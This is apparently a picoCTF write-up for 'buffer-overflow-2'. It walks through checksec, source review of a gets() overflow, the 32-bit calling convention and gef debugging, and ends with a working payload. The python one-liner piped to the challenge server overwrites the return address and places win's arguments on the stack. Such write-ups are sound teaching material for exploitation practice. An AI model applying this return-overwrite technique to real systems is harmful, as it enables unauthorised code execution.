# buffer-overflow-2

## Description

Control the return address and arguments

## Enumeration

Check what we're working with here:

```bash
$ file ./vuln
./vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped
```

32-bit LSB. dynamically linked. Not stripped.

Check artifact securities:

```bash
$ pwn checksec ./vuln                                                                                                   
[*] '/home/user/Documents/repos/k00l-beanz/ctf/picoCTF/pwn/buffer-overflow-2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Only security is NX.

## Code Review

Looking at `main`:

```c

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

There is a function `vuln`:

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```

Which has a call to `gets`

Lastly, there is a `win` function which loads the flag into memory, checks `arg1` and `arg2` for the correct values and prints the flag.

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

The unique aspect of this challenge is that we need to simulate a function call. The calling convention for ELF files varies depending on whether they are 32-bit or 64-bit. From our enumeration, we know we're dealing with a 32-bit ELF file. In a 32-bit ELF environment, arguments are passed to subroutines via the stack. This means that when a function is called, the arguments are pushed onto the stack before the return address. In the context of C, function arguments are pushed onto the stack in right-to-left (RTL) order, meaning the last argument is pushed first. If you're interested in learning more about x86 calling convention, check out [this](https://en.wikipedia.org/wiki/X86_calling_conventions) wikipedia page.

```
0x1000  +-------------------------+             0x1000  +-------------------------+
        |                         |                     |                         |
        |                         |                     |                         |
        |                         |                     |                         |
        |                         |                     |                         | < esp
        |                         |                     |     return pointer      |
        |                         | < esp               |          1              |
        |                         | < ebp               |          2              | < ebp
        |-------------------------|                     |-------------------------|
        |                         |                     |                         |
        |      push 2             | < eip   =====>      |      push 2             |
        |      push 1             |                     |      push 1             |
        |      call win(1, 2)     |                     |      call win(1, 2)     |
        |                         |                     |                         |
        |                         |                     |                         |
        |                         |                     |                         |
        |                         |                     |                         |
        |                         |                     |                         |
0xffff  +-------------------------+             0xffff  +-------------------------+
```

## Exploit Development

Lets start by first finding the offset from the return pointer:

```bash
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x08049338 <+0>:     endbr32
   0x0804933c <+4>:     push   ebp
   0x0804933d <+5>:     mov    ebp,esp
   0x0804933f <+7>:     push   ebx
   0x08049340 <+8>:     sub    esp,0x74
   0x08049343 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x08049348 <+16>:    add    ebx,0x2cb8
   0x0804934e <+22>:    sub    esp,0xc
   0x08049351 <+25>:    lea    eax,[ebp-0x6c]
   0x08049354 <+28>:    push   eax
   0x08049355 <+29>:    call   0x80490f0 <gets@plt>
   0x0804935a <+34>:    add    esp,0x10
   0x0804935d <+37>:    sub    esp,0xc
   0x08049360 <+40>:    lea    eax,[ebp-0x6c]
   0x08049363 <+43>:    push   eax
   0x08049364 <+44>:    call   0x8049120 <puts@plt>
   0x08049369 <+49>:    add    esp,0x10
   0x0804936c <+52>:    nop
   0x0804936d <+53>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049370 <+56>:    leave
   0x08049371 <+57>:    ret
gef➤  b *0x08049371
Breakpoint 2 at 0x8049371
gef➤  pattern create 256
[+] Generating a pattern of 256 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
...
gef➤  pattern offset $esp
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```

Our offset is 112 bytes. 

Now for the tricky part. 

Recall that when a subroutine is called, the caller will setup the stack like:

```

    0x1000  +-------------------------+
            |                         |
            |                         | < esp
            |                         |
            |                         |
            |                         |
            |                         | 
            |                         | < ebp-0x8
            |                         | < ebp-0x4
            |       saved ebp         | < ebp
            |      return addr        | < ebp+0x4
            |         arg1            | < ebp+0x8
            |         arg2            | < ebp+0xc
            |         argN            |
            |                         |
            |                         |
            |                         |
            |                         |
    0x1fff  +-------------------------+

```

When we jump to a subroutine, the callee assumes that the caller has set up the stack correctly. For example, when we call `win`, the program expects that `arg1` and `arg2` are placed on the stack in the correct positions by the caller. However, this expectation is not met if we force the program to jump to win by overriding the return pointer. In this case, when `win` tries to access `arg1` and `arg2`, it will end up reading arbitrary data from the stack.

First, we'll need the address of `win`:

```bash
$ nm ./vuln | grep "win"
08049296 T win
```

Then create a payload and save it to a file:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 112 + b"\x96\x92\x04\x08" + b"B" * 4 + b"C" * 4 + b"D" * 4)' > payload
```

Next, set a breakpoint at the first `cmp` check and run the program:

```bash
gef➤  disass win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
   0x0804929a <+4>:     push   ebp
   0x0804929b <+5>:     mov    ebp,esp
   0x0804929d <+7>:     push   ebx
   0x0804929e <+8>:     sub    esp,0x54
   0x080492a1 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:    add    ebx,0x2d5a
   0x080492ac <+22>:    sub    esp,0x8
   0x080492af <+25>:    lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:    push   eax
   0x080492b6 <+32>:    lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:    push   eax
   0x080492bd <+39>:    call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:    add    esp,0x10
   0x080492c5 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:    jne    0x80492f8 <win+98>
   0x080492ce <+56>:    sub    esp,0x4
   0x080492d1 <+59>:    lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:    push   eax
   0x080492d8 <+66>:    lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:    push   eax
   0x080492df <+73>:    lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:    push   eax
   0x080492e6 <+80>:    call   0x80490e0 <printf@plt>
   0x080492eb <+85>:    add    esp,0x10
   0x080492ee <+88>:    sub    esp,0xc
   0x080492f1 <+91>:    push   0x0
   0x080492f3 <+93>:    call   0x8049130 <exit@plt>
   0x080492f8 <+98>:    sub    esp,0x4
   0x080492fb <+101>:   push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:   push   0x40
   0x08049300 <+106>:   lea    eax,[ebp-0x4c]
   0x08049303 <+109>:   push   eax
   0x08049304 <+110>:   call   0x8049100 <fgets@plt>
   0x08049309 <+115>:   add    esp,0x10
   0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x08049313 <+125>:   jne    0x804932f <win+153>
   0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x0804931c <+134>:   jne    0x8049332 <win+156>
   0x0804931e <+136>:   sub    esp,0xc
   0x08049321 <+139>:   lea    eax,[ebp-0x4c]
   0x08049324 <+142>:   push   eax
   0x08049325 <+143>:   call   0x80490e0 <printf@plt>
   0x0804932a <+148>:   add    esp,0x10
   0x0804932d <+151>:   jmp    0x8049333 <win+157>
   0x0804932f <+153>:   nop
   0x08049330 <+154>:   jmp    0x8049333 <win+157>
   0x08049332 <+156>:   nop
   0x08049333 <+157>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:   leave
   0x08049337 <+161>:   ret
End of assembler dump.
gef➤  b *0x0804930c
Breakpoint 2 at 0x804930c
gef➤  r < payload
```

Viewing the data placed onto the stack below the base pointer:

```bash
gef➤  x/xw $ebp+4
0xffffce50:     0x42424242
gef➤  x/xw $ebp+8
0xffffce54:     0x43434343
gef➤  x/xw $ebp+0xc
0xffffce58:     0x44444444
```

Where `ebp+4` is the "saved" return address, `ebp+8` is `arg1`, and `ebp+0xc` is `arg2`.

Lastly, we just need to write the correct values to `ebp+8` and `ebp+0xc` in little endian format:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 112 + b"\x96\x92\x04\x08" + b"B" * 4 + b"\x0d\xf0\xfe\xca" + b"\x0d\xf0\x0d\xf0" + b"\n")' | nc saturn.picoctf.net 62762
```

And we pwned the challenge!